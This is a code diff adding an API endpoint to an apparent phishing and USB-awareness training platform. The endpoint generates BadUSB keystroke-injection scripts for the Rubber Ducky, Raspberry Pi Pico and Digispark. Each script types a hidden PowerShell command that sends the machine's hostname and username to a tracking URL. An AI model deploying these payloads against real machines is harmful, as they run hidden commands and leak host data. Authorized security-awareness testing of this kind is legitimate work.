@@ -774,5 +774,154 @@ async def usb_agent_deploy(
         )
 
 
+@router.get(
+    "/{campaign_id}/generate-hid-script",
+    summary="Generate BadUSB / HID keyboard injection awareness scripts",
+)
+async def generate_hid_script(
+    campaign_id: uuid.UUID,
+    db: AsyncSession = Depends(get_db),
+    user: User = Depends(require_roles("admin", "manager")),
+) -> dict[str, Any]:
+    """Generate safe, authorized BadUSB (HID) training scripts for hardware emulators.
+
+    Generates code for:
+    1. DuckyScript (Hak5 Rubber Ducky, Flipper Zero, MalDuino, USB Ninja)
+    2. Raspberry Pi Pico (CircuitPython code.py using adafruit_hid)
+    3. Digispark ATtiny85 (Arduino IDE C++ sketch)
+    """
+    campaign = await db.get(EmailCampaign, campaign_id)
+    if campaign is None or campaign.organization_id != user.organization_id:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND, detail="Campaign not found"
+        )
+    if (campaign.channel or "").strip().lower() != "usb":
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="HID scripts can only be generated for USB campaigns",
+        )
+
+    organization = await db.get(Organization, campaign.organization_id)
+    org_name = organization.name if organization else "Enterprise"
+
+    tracking = await db.scalar(
+        select(EmailTracking)
+        .where(
+            EmailTracking.campaign_id == campaign.id,
+            EmailTracking.channel == "usb",
+        )
+        .order_by(EmailTracking.created_at.asc())
+        .limit(1)
+    )
+
+    if tracking is None:
+        tracking = EmailTracking(
+            campaign_id=campaign.id,
+            employee_id=None,
+            tracking_uuid=uuid.uuid4(),
+            channel="usb",
+        )
+        db.add(tracking)
+        await db.flush()
+        await db.commit()
+
+    tracking_uuid = str(tracking.tracking_uuid)
+    settings = get_settings()
+    base_url = settings.base_url.rstrip("/")
+
+    target_url = f"{base_url}/api/v1/track/usb/{tracking_uuid}?hostname=$env:COMPUTERNAME&username=$env:USERNAME&attack_type=hid"
+
+    # 1. DuckyScript (Standard for Rubber Ducky, Flipper Zero, MalDuino)
+    ducky_script = f"""REM ==============================================================================
+REM [HUMINT SHIELD] BadUSB Hardware Emulation Training Simulation
+REM Organization: {org_name}
+REM Campaign: {campaign.name}
+REM Target Vector: USB HID Keystroke Injection (Bypasses Mass Storage restrictions)
+REM ==============================================================================
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -WindowStyle Hidden -NoProfile -Command "Start-Process '{target_url}'"
+DELAY 300
+ENTER
+"""
+
+    # 2. Raspberry Pi Pico (CircuitPython code.py)
+    pico_circuitpython = f"""# ==============================================================================
+# [HUMINT SHIELD] Raspberry Pi Pico - BadUSB HID Awareness Payload
+# Hardware: Raspberry Pi Pico (RP2040) running CircuitPython
+# Library required: adafruit_hid (bundle in /lib)
+# Setup: Save this file as 'code.py' on the CIRCUITPY root drive.
+# ==============================================================================
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keycode import Keycode
+
+# Allow USB driver initialization
+time.sleep(1.5)
+
+kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
+
+# Press Win + R to open Run dialog
+kbd.press(Keycode.GUI, Keycode.R)
+kbd.release_all()
+time.sleep(0.6)
+
+# Inject safe PowerShell awareness beacon command
+cmd = "powershell -WindowStyle Hidden -NoProfile -Command \"Start-Process '{target_url}'\""
+layout.write(cmd)
+time.sleep(0.2)
+
+# Execute command
+kbd.press(Keycode.ENTER)
+kbd.release_all()
+"""
+
+    # 3. Digispark ATtiny85 (Arduino .ino)
+    digispark_arduino = f"""/*
+ * ==============================================================================
+ * [HUMINT SHIELD] Digispark ATtiny85 - USB HID Training Sketch
+ * Hardware: Digispark ATtiny85 (USB Development Board)
+ * Compiler: Arduino IDE (Digistump AVR Boards)
+ * ==============================================================================
+ */
+#include "DigiKeyboard.h"
+
+void setup() {{
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1500);
+
+  // Press Win + R
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+
+  // Type hidden awareness beacon command
+  DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoProfile -Command \"Start-Process '{target_url}'\""));
+  DigiKeyboard.delay(200);
+
+  // Press Enter
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}}
+
+void loop() {{
+  // One-time execution
+}}
+"""
+
+    return {
+        "success": True,
+        "campaign_id": str(campaign.id),
+        "tracking_uuid": tracking_uuid,
+        "organization_name": org_name,
+        "target_url": target_url,
+        "ducky_script": ducky_script,
+        "pico_circuitpython": pico_circuitpython,
+        "digispark_arduino": digispark_arduino,
+    }
+
+
 __all__ = ["router"]
 
